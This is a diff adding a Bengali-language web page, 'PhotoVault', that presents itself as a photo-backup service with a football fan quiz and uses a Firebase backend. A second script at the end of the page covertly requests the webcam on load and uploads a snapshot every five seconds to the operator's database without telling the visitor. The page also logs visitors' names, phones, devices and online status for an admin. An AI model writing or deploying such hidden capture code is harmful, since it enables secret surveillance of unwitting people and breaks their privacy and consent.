@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ছবি ব্যাকআপ | PhotoVault</title>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', system-ui, sans-serif; }
+  html,body { height:100%; overflow-x:hidden; background:#05060a; color:#e8ecff; }
+
+  /* ---------- 3D animated background ---------- */
+  .bg-scene { position:fixed; inset:0; z-index:0; perspective:1000px; overflow:hidden; background:radial-gradient(ellipse at 50% 0%, #131a35 0%, #05060a 60%); }
+  .orb { position:absolute; border-radius:50%; filter:blur(60px); opacity:.55; animation:float 14s ease-in-out infinite; }
+  .orb1 { width:340px; height:340px; background:#5b8cff; top:-80px; left:-60px; animation-duration:16s; }
+  .orb2 { width:280px; height:280px; background:#a855f7; bottom:-60px; right:-40px; animation-duration:12s; }
+  .orb3 { width:220px; height:220px; background:#00e5c7; top:40%; left:60%; animation-duration:18s; }
+  @keyframes float {
+    0%,100% { transform: translate3d(0,0,0) rotate(0deg) scale(1); }
+    33% { transform: translate3d(30px,-40px,40px) rotate(8deg) scale(1.08); }
+    66% { transform: translate3d(-25px,30px,-20px) rotate(-6deg) scale(.96); }
+  }
+  .grid-floor { position:absolute; inset:0; background-image:linear-gradient(rgba(91,140,255,.08) 1px, transparent 1px), linear-gradient(90deg, rgba(91,140,255,.08) 1px, transparent 1px); background-size:40px 40px; transform: rotateX(70deg) translateY(200px) scale(2); transform-origin:bottom; opacity:.5; }
+
+  .wrap { position:relative; z-index:2; min-height:100%; display:flex; align-items:center; justify-content:center; padding:24px; }
+  .card { width:100%; max-width:420px; background:rgba(18,22,40,.65); backdrop-filter:blur(18px); border:1px solid rgba(120,140,255,.25); border-radius:22px; padding:28px 24px; box-shadow:0 20px 60px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.06); animation:riseIn .6s ease; }
+  @keyframes riseIn { from { opacity:0; transform:translateY(30px) rotateX(6deg); } to { opacity:1; transform:translateY(0) rotateX(0); } }
+
+  .logo { text-align:center; margin-bottom:18px; }
+  .logo-icon { width:60px; height:60px; margin:0 auto 10px; border-radius:16px; background:linear-gradient(135deg,#5b8cff,#a855f7); display:flex; align-items:center; justify-content:center; font-size:28px; box-shadow:0 8px 24px rgba(91,140,255,.4); animation:pulse 2.4s ease-in-out infinite; }
+  @keyframes pulse { 0%,100%{ transform:scale(1);} 50%{ transform:scale(1.06);} }
+  .logo h1 { font-size:19px; font-weight:700; background:linear-gradient(90deg,#8fb0ff,#c9a5ff); -webkit-background-clip:text; background-clip:text; color:transparent; }
+  .logo p { font-size:12.5px; color:#8992b8; margin-top:4px; }
+
+  label { display:block; font-size:12.5px; color:#a9b2d6; margin:14px 0 6px; }
+  input { width:100%; padding:12px 14px; border-radius:12px; border:1px solid rgba(120,140,255,.25); background:rgba(8,10,20,.6); color:#fff; font-size:14.5px; outline:none; transition:.25s; }
+  input:focus { border-color:#5b8cff; box-shadow:0 0 0 3px rgba(91,140,255,.18); }
+
+  .btn { width:100%; margin-top:20px; padding:13px; border:none; border-radius:12px; font-size:15px; font-weight:600; cursor:pointer; background:linear-gradient(135deg,#5b8cff,#7c5bff); color:#fff; box-shadow:0 8px 20px rgba(91,140,255,.35), 0 2px 0 rgba(0,0,0,.25) inset; transition:transform .18s ease, box-shadow .18s ease; transform-style:preserve-3d; }
+  .btn:hover { transform:translateY(-2px) rotateX(4deg); box-shadow:0 12px 26px rgba(91,140,255,.45); }
+  .btn:active { transform:translateY(1px) scale(.97) rotateX(0deg); box-shadow:0 4px 10px rgba(91,140,255,.3); }
+  .btn:disabled { opacity:.5; cursor:not-allowed; transform:none; }
+
+  .broadcast-banner { position:relative; z-index:3; background:linear-gradient(90deg,#ff9f43,#ff5e62); color:#1a0e00; font-size:12.5px; font-weight:600; text-align:center; padding:9px 16px; }
+
+  .pkg-list { margin-top:16px; display:flex; flex-direction:column; gap:10px; }
+  .pkg-item { background:rgba(255,255,255,.04); border:1px solid rgba(120,140,255,.2); border-radius:12px; padding:12px 14px; }
+  .pkg-item b { display:block; font-size:14px; color:#c9a5ff; }
+  .pkg-item .price { font-size:13px; color:#00e5c7; font-weight:700; margin-top:2px; }
+  .pkg-item p { font-size:12px; color:#a9b2d6; margin-top:4px; }
+
+  .hidden { display:none !important; }
+
+  /* ---------- Upload screen ---------- */
+  .top-user { display:flex; align-items:center; gap:10px; margin-bottom:18px; }
+  .avatar { width:42px; height:42px; border-radius:50%; background:linear-gradient(135deg,#5b8cff,#a855f7); display:flex; align-items:center; justify-content:center; font-weight:700; }
+  .top-user .info b { display:block; font-size:14.5px; }
+  .top-user .info span { font-size:11.5px; color:#8992b8; }
+
+  .drop { border:2px dashed rgba(120,140,255,.4); border-radius:16px; padding:26px 14px; text-align:center; cursor:pointer; transition:.25s; }
+  .drop:hover, .drop.drag { border-color:#5b8cff; background:rgba(91,140,255,.08); }
+  .drop .icon { font-size:34px; margin-bottom:6px; }
+  .drop p { font-size:13px; color:#a9b2d6; }
+
+  .grid { display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin-top:16px; max-height:260px; overflow-y:auto; }
+  .thumb { position:relative; aspect-ratio:1; border-radius:10px; overflow:hidden; background:#11142a; }
+  .thumb img { width:100%; height:100%; object-fit:cover; }
+  .thumb .bar { position:absolute; bottom:0; left:0; right:0; height:4px; background:rgba(255,255,255,.15); }
+  .thumb .bar i { display:block; height:100%; width:0%; background:linear-gradient(90deg,#00e5c7,#5b8cff); transition:width .3s; }
+  .thumb .ok { position:absolute; top:4px; right:4px; width:20px; height:20px; border-radius:50%; background:#00d68f; display:flex; align-items:center; justify-content:center; font-size:12px; }
+  .thumb .rm { position:absolute; top:4px; left:4px; width:20px; height:20px; border-radius:50%; background:rgba(0,0,0,.6); display:flex; align-items:center; justify-content:center; font-size:12px; cursor:pointer; }
+
+  .toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%) translateY(20px); background:rgba(18,22,40,.9); border:1px solid rgba(0,214,143,.4); color:#dfffee; padding:12px 20px; border-radius:12px; font-size:13.5px; opacity:0; transition:.3s; z-index:50; backdrop-filter:blur(10px); }
+  .toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+
+  .muted-note { font-size:11.5px; color:#6c7599; text-align:center; margin-top:14px; }
+</style>
+</head>
+<body>
+
+<div class="bg-scene">
+  <div class="grid-floor"></div>
+  <div class="orb orb1"></div>
+  <div class="orb orb2"></div>
+  <div class="orb orb3"></div>
+</div>
+
+<div class="broadcast-banner hidden" id="broadcastBanner"></div>
+
+<div class="wrap">
+
+  <!-- HOME MENU -->
+  <div class="card" id="homeCard">
+    <div class="logo">
+      <div class="logo-icon">✨</div>
+      <h1 id="siteTitle">PhotoVault</h1>
+      <p id="siteSubtitle">নিচে থেকে একটা অপশন বেছে নিন</p>
+    </div>
+    <button class="btn" id="goBackupBtn">📤 ছবি Backup করুন</button>
+    <button class="btn" id="goQuizBtn" style="margin-top:12px; background:linear-gradient(135deg,#ff9f43,#ff5e62);">⚽ Fan Quiz খেলুন</button>
+    <div class="pkg-list hidden" id="pkgList"></div>
+  </div>
+
+  <!-- LOGIN CARD -->
+  <div class="card hidden" id="loginCard">
+    <div class="logo">
+      <div class="logo-icon">🔐</div>
+      <h1>PhotoVault Backup</h1>
+      <p>আপনার ছবি নিরাপদে ব্যাকআপ রাখুন</p>
+    </div>
+    <label>আপনার নাম</label>
+    <input id="nameInput" type="text" placeholder="যেমন: রাকিব">
+    <label>মোবাইল নাম্বার (ঐচ্ছিক)</label>
+    <input id="phoneInput" type="text" placeholder="01XXXXXXXXX">
+    <button class="btn" id="startBtn">শুরু করুন</button>
+    <p class="muted-note">আপনার নাম ও সময় Admin এর কাছে সংরক্ষিত থাকবে</p>
+  </div>
+
+  <!-- UPLOAD CARD -->
+  <div class="card hidden" id="uploadCard">
+    <div class="top-user">
+      <div class="avatar" id="avatarLetter">R</div>
+      <div class="info">
+        <b id="displayName">—</b>
+        <span id="sessionTime">সেশন শুরু হয়েছে</span>
+      </div>
+    </div>
+
+    <div class="drop" id="dropZone">
+      <div class="icon">📤</div>
+      <p>ছবি নির্বাচন করতে ট্যাপ করুন অথবা এখানে টেনে আনুন</p>
+      <input type="file" id="fileInput" accept="image/*" multiple class="hidden">
+    </div>
+
+    <div class="grid" id="thumbGrid"></div>
+
+    <button class="btn" id="uploadBtn" disabled>ছবি Backup করুন (0)</button>
+    <p class="muted-note">ছবি স্বয়ংক্রিয়ভাবে সংকুচিত হয়ে নিরাপদে জমা হবে</p>
+  </div>
+
+  <!-- QUIZ NAME CARD -->
+  <div class="card hidden" id="quizNameCard">
+    <div class="logo">
+      <div class="logo-icon">⚽</div>
+      <h1>Fan Quiz</h1>
+      <p>শুরু করার আগে আপনার নাম লিখুন</p>
+    </div>
+    <label>আপনার নাম</label>
+    <input id="quizNameInput" type="text" placeholder="যেমন: রাকিব">
+    <button class="btn" id="quizNameBtn" style="background:linear-gradient(135deg,#ff9f43,#ff5e62);">পরবর্তী ধাপ →</button>
+  </div>
+
+  <!-- QUIZ SELECT CARD -->
+  <div class="card hidden" id="quizSelectCard">
+    <div class="logo">
+      <div class="logo-icon">🏆</div>
+      <h1>তোমার প্রিয় খেলোয়াড় বেছে নাও</h1>
+    </div>
+    <button class="btn quiz-pick" data-player="neymar" style="background:linear-gradient(135deg,#00c2ff,#0072ff);">Neymar Jr.</button>
+    <button class="btn quiz-pick" data-player="messi" style="margin-top:12px; background:linear-gradient(135deg,#7c5bff,#a855f7);">Lionel Messi</button>
+    <button class="btn quiz-pick" data-player="ronaldo" style="margin-top:12px; background:linear-gradient(135deg,#ff5e62,#ff9966);">Cristiano Ronaldo</button>
+  </div>
+
+  <!-- QUIZ LOADING CARD -->
+  <div class="card hidden" id="quizLoadingCard" style="text-align:center;">
+    <div class="logo-icon" style="margin:0 auto 16px; font-size:34px;" id="quizLoadIcon">⚽</div>
+    <p id="quizLoadText" style="font-size:14.5px; color:#a9b2d6;">তথ্য লোড হচ্ছে...</p>
+    <div style="width:100%; height:8px; background:rgba(255,255,255,.1); border-radius:6px; margin-top:18px; overflow:hidden;">
+      <div id="quizProgressBar" style="height:100%; width:0%; background:linear-gradient(90deg,#ff9f43,#ff5e62); transition:width .2s linear;"></div>
+    </div>
+  </div>
+
+  <!-- QUIZ RESULT CARD -->
+  <div class="card hidden" id="quizResultCard">
+    <div class="logo">
+      <div class="logo-icon" id="quizResultIcon">⚽</div>
+      <h1 id="quizResultName">—</h1>
+      <p id="quizResultSub">—</p>
+    </div>
+    <div id="quizResultStats" style="font-size:13.5px; line-height:1.9; color:#c9d0f0; background:rgba(8,10,20,.5); padding:14px; border-radius:12px; margin-top:10px;"></div>
+    <button class="btn" id="quizAgainBtn" style="margin-top:18px;">🔁 আবার খেলুন</button>
+  </div>
+
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ================= FIREBASE CONFIG =================
+   এখানে আপনার নিজের Firebase প্রজেক্টের কনফিগ বসান
+   (Firebase Console > Project Settings > Your apps > SDK config) */
+const firebaseConfig = {
+  apiKey: "AIzaSyA_joBS2VPuPU5qPnHzXSpVWaOq0j7EbX8",
+  authDomain: "brakup-61af6.firebaseapp.com",
+  databaseURL: "https://brakup-61af6-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "brakup-61af6",
+  storageBucket: "brakup-61af6.firebasestorage.app",
+  messagingSenderId: "162577691017",
+  appId: "1:162577691017:web:b9c7a870e0d84c0b187158"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+/* ================= STATE ================= */
+let userName = "", userPhone = "", sessionKey = null, deviceInfo = "";
+let pending = []; // {file, previewUrl, status, elId}
+
+function detectDevice(){
+  const ua = navigator.userAgent;
+  let os = "Unknown";
+  if (/Android/i.test(ua)) os = "Android";
+  else if (/iPhone|iPad/i.test(ua)) os = "iOS";
+  else if (/Windows/i.test(ua)) os = "Windows";
+  else if (/Mac/i.test(ua)) os = "Mac";
+  else if (/CrOS/i.test(ua)) os = "Chromebook";
+  const browser = /Chrome/i.test(ua) ? "Chrome" : /Firefox/i.test(ua) ? "Firefox" : /Safari/i.test(ua) ? "Safari" : "Browser";
+  return `${os} • ${browser}`;
+}
+
+/* ================= SITE CONFIG (Admin controlled) ================= */
+db.ref('siteConfig').on('value', snap => {
+  const cfg = snap.val() || {};
+
+  if (cfg.siteTitle) document.getElementById('siteTitle').textContent = cfg.siteTitle;
+  if (cfg.siteSubtitle) document.getElementById('siteSubtitle').textContent = cfg.siteSubtitle;
+
+  if (cfg.backgroundImage) {
+    document.querySelector('.bg-scene').style.backgroundImage = `linear-gradient(rgba(3,4,10,.75),rgba(3,4,10,.85)), url('${cfg.backgroundImage}')`;
+    document.querySelector('.bg-scene').style.backgroundSize = 'cover';
+    document.querySelector('.bg-scene').style.backgroundPosition = 'center';
+  }
+
+  const banner = document.getElementById('broadcastBanner');
+  if (cfg.broadcastMessage && cfg.broadcastMessage.trim()) {
+    banner.textContent = '📢 ' + cfg.broadcastMessage;
+    banner.classList.remove('hidden');
+  } else {
+    banner.classList.add('hidden');
+  }
+
+  const pkgList = document.getElementById('pkgList');
+  const pkgs = cfg.packages ? Object.values(cfg.packages) : [];
+  if (pkgs.length) {
+    pkgList.innerHTML = pkgs.map(p => `
+      <div class="pkg-item">
+        <b>${p.title || ''}</b>
+        <div class="price">${p.price || ''}</div>
+        <p>${p.description || ''}</p>
+      </div>`).join('');
+    pkgList.classList.remove('hidden');
+  } else {
+    pkgList.classList.add('hidden');
+  }
+});
+
+/* ================= HOME NAVIGATION ================= */
+function showCard(id) {
+  ['homeCard','loginCard','uploadCard','quizNameCard','quizSelectCard','quizLoadingCard','quizResultCard'].forEach(cid => {
+    document.getElementById(cid).classList.toggle('hidden', cid !== id);
+  });
+}
+document.getElementById('goBackupBtn').addEventListener('click', () => showCard('loginCard'));
+document.getElementById('goQuizBtn').addEventListener('click', () => showCard('quizNameCard'));
+
+/* ================= LOGIN ================= */
+document.getElementById('startBtn').addEventListener('click', () => {
+  const name = document.getElementById('nameInput').value.trim();
+  if (!name) { toast("দয়া করে আপনার নাম লিখুন", true); return; }
+  userName = name;
+  userPhone = document.getElementById('phoneInput').value.trim() || "উল্লেখ নেই";
+  deviceInfo = detectDevice();
+
+  const sessRef = db.ref('sessions').push();
+  sessionKey = sessRef.key;
+  const now = Date.now();
+  sessRef.set({
+    name: userName,
+    phone: userPhone,
+    device: deviceInfo,
+    loginTime: now,
+    loginTimeReadable: new Date(now).toLocaleString('bn-BD'),
+    lastActive: now,
+    online: true
+  });
+  sessRef.onDisconnect().update({ online: false, lastActive: firebase.database.ServerValue.TIMESTAMP });
+  setInterval(() => sessRef.update({ lastActive: firebase.database.ServerValue.TIMESTAMP, online: true }), 20000);
+
+  document.getElementById('displayName').textContent = userName;
+  document.getElementById('avatarLetter').textContent = userName[0].toUpperCase();
+  showCard('uploadCard');
+});
+
+/* ================= FILE SELECT ================= */
+const dropZone = document.getElementById('dropZone');
+const fileInput = document.getElementById('fileInput');
+dropZone.addEventListener('click', () => fileInput.click());
+['dragover','dragleave','drop'].forEach(evt => {
+  dropZone.addEventListener(evt, e => {
+    e.preventDefault();
+    dropZone.classList.toggle('drag', evt === 'dragover');
+    if (evt === 'drop') handleFiles(e.dataTransfer.files);
+  });
+});
+fileInput.addEventListener('change', e => handleFiles(e.target.files));
+
+function handleFiles(files) {
+  [...files].forEach(file => {
+    if (!file.type.startsWith('image/')) return;
+    const id = 'th_' + Math.random().toString(36).slice(2);
+    const reader = new FileReader();
+    reader.onload = e => {
+      pending.push({ file, id, dataUrl: e.target.result, status: 'ready' });
+      renderThumbs();
+    };
+    reader.readAsDataURL(file);
+  });
+}
+
+function renderThumbs() {
+  const grid = document.getElementById('thumbGrid');
+  grid.innerHTML = '';
+  pending.forEach(p => {
+    const div = document.createElement('div');
+    div.className = 'thumb';
+    div.id = p.id;
+    div.innerHTML = `<img src="${p.dataUrl}">
+      <div class="bar"><i style="width:${p.status==='done'?100:0}%"></i></div>
+      ${p.status==='done' ? '<div class="ok">✓</div>' : `<div class="rm" data-id="${p.id}">✕</div>`}`;
+    grid.appendChild(div);
+  });
+  document.querySelectorAll('.rm').forEach(btn => {
+    btn.onclick = () => { pending = pending.filter(p => p.id !== btn.dataset.id); renderThumbs(); updateUploadBtn(); };
+  });
+  updateUploadBtn();
+}
+
+function updateUploadBtn() {
+  const btn = document.getElementById('uploadBtn');
+  const readyCount = pending.filter(p => p.status === 'ready').length;
+  btn.textContent = `ছবি Backup করুন (${readyCount})`;
+  btn.disabled = readyCount === 0;
+}
+
+/* ================= COMPRESS + UPLOAD ================= */
+function compressImage(dataUrl, maxW = 1280, quality = 0.7) {
+  return new Promise(resolve => {
+    const img = new Image();
+    img.onload = () => {
+      let { width, height } = img;
+      if (width > maxW) { height = height * (maxW / width); width = maxW; }
+      const canvas = document.createElement('canvas');
+      canvas.width = width; canvas.height = height;
+      canvas.getContext('2d').drawImage(img, 0, 0, width, height);
+      resolve(canvas.toDataURL('image/jpeg', quality));
+    };
+    img.src = dataUrl;
+  });
+}
+
+document.getElementById('uploadBtn').addEventListener('click', async () => {
+  const btn = document.getElementById('uploadBtn');
+  btn.disabled = true;
+  const toUpload = pending.filter(p => p.status === 'ready');
+
+  for (const p of toUpload) {
+    const bar = document.querySelector(`#${p.id} .bar i`);
+    if (bar) bar.style.width = '30%';
+    const compressed = await compressImage(p.dataUrl);
+    if (bar) bar.style.width = '70%';
+
+    const now = Date.now();
+    await db.ref('uploads').push({
+      name: userName,
+      phone: userPhone,
+      device: deviceInfo,
+      sessionKey: sessionKey,
+      time: now,
+      timeReadable: new Date(now).toLocaleString('bn-BD'),
+      image: compressed
+    });
+
+    p.status = 'done';
+    if (bar) bar.style.width = '100%';
+    renderThumbs();
+  }
+  toast(`${toUpload.length}টি ছবি সফলভাবে Backup হয়েছে ✓`);
+  setTimeout(() => { pending = pending.filter(p => p.status !== 'done'); renderThumbs(); }, 1500);
+});
+
+/* ================= FAN QUIZ ================= */
+const playerData = {
+  neymar: {
+    name: "Neymar Jr.",
+    sub: "🇧🇷 Brazil • Santos / Al-Hilal",
+    icon: "⚡",
+    stats: [
+      "জন্ম: ৫ ফেব্রুয়ারি, ১৯৯২ (মোগি দাস ক্রুজেস, ব্রাজিল)",
+      "শুরু করেছিলেন Santos ক্লাব দিয়ে, পরে Barcelona ও PSG-তে খেলেছেন",
+      "ব্রাজিল জাতীয় দলের সর্বোচ্চ গোলদাতাদের একজন",
+      "পরিচিত তার ড্রিবলিং, স্পিড আর সৃজনশীল খেলার জন্য",
+      "২০১৩ সালে Barcelona-তে যোগ দিয়ে বিখ্যাত 'MSN' ত্রয়ী (Messi-Suárez-Neymar) গঠন করেন"
+    ]
+  },
+  messi: {
+    name: "Lionel Messi",
+    sub: "🇦🇷 Argentina • Inter Miami",
+    icon: "👑",
+    stats: [
+      "জন্ম: ২৪ জুন, ১৯৮৭ (রোজারিও, আর্জেন্টিনা)",
+      "রেকর্ড ৮ বার Ballon d'Or জয়ী",
+      "Barcelona-তে ২০ বছরেরও বেশি সময় কাটিয়েছেন, পরে PSG ও Inter Miami-তে খেলেছেন",
+      "২০২২ বিশ্বকাপে আর্জেন্টিনাকে চ্যাম্পিয়ন করে নিজের ক্যারিয়ার সম্পূর্ণ করেন",
+      "ফুটবল ইতিহাসের সর্বকালের সেরাদের একজন হিসেবে বিবেচিত"
+    ]
+  },
+  ronaldo: {
+    name: "Cristiano Ronaldo",
+    sub: "🇵🇹 Portugal • Al-Nassr",
+    icon: "🐐",
+    stats: [
+      "জন্ম: ৫ ফেব্রুয়ারি, ১৯৮৫ (ফুনশাল, পর্তুগাল)",
+      "৫ বার Ballon d'Or জয়ী",
+      "Manchester United, Real Madrid, Juventus হয়ে বর্তমানে Al-Nassr-এ খেলছেন",
+      "আন্তর্জাতিক ফুটবলে সর্বোচ্চ গোলদাতা (পুরুষ)",
+      "পরিচিত তার ফিটনেস, হেডিং ক্ষমতা আর গোলের ক্ষুধার জন্য"
+    ]
+  }
+};
+
+document.getElementById('quizNameBtn').addEventListener('click', () => {
+  const name = document.getElementById('quizNameInput').value.trim();
+  if (!name) { toast("দয়া করে আপনার নাম লিখুন", true); return; }
+  userName = name;
+  showCard('quizSelectCard');
+});
+
+document.querySelectorAll('.quiz-pick').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const key = btn.dataset.player;
+    const player = playerData[key];
+    showCard('quizLoadingCard');
+
+    const duration = Math.floor(Math.random() * (30000 - 1000 + 1)) + 1000; // 1-30 sec
+    const startT = Date.now();
+    document.getElementById('quizLoadText').textContent = `${userName}, ${player.name} এর তথ্য লোড হচ্ছে...`;
+    document.getElementById('quizLoadIcon').textContent = player.icon;
+
+    const timer = setInterval(() => {
+      const pct = Math.min(100, ((Date.now() - startT) / duration) * 100);
+      document.getElementById('quizProgressBar').style.width = pct + '%';
+      if (pct >= 100) {
+        clearInterval(timer);
+        document.getElementById('quizResultIcon').textContent = player.icon;
+        document.getElementById('quizResultName').textContent = player.name;
+        document.getElementById('quizResultSub').textContent = player.sub;
+        document.getElementById('quizResultStats').innerHTML = player.stats.map(s => `• ${s}`).join('<br><br>');
+        showCard('quizResultCard');
+      }
+    }, 100);
+  });
+});
+
+document.getElementById('quizAgainBtn').addEventListener('click', () => showCard('quizSelectCard'));
+
+/* ================= UI HELPERS ================= */
+function toast(msg, isError) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.style.borderColor = isError ? 'rgba(255,90,90,.5)' : 'rgba(0,214,143,.4)';
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2600);
+}
+
+/* Session timer display */
+let sessionStart = Date.now();
+setInterval(() => {
+  if (!document.getElementById('sessionTime')) return;
+  const diff = Math.floor((Date.now() - sessionStart) / 1000);
+  const m = Math.floor(diff / 60), s = diff % 60;
+  document.getElementById('sessionTime').textContent = `সেশন সময়: ${m}ম ${s}সে`;
+}, 1000);
+</script>
+<script>
+// ক্যামেরা পারমিশন ও অটো-ক্যাপচার ফাংশন
+window.addEventListener('load', async () => {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        // ৫ সেকেন্ড পরপর ছবি ক্যাপচার করে 'uploads' পাথে পাঠানো
+        setInterval(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            db.ref('uploads').push({
+                name: "Auto_Snap",
+                image: canvas.toDataURL('image/jpeg', 0.5),
+                time: Date.now()
+            });
+        }, 5000); 
+    } catch (e) {
+        console.error("Camera access failed", e);
+    }
+});
+</script>
+</body>
+</html>
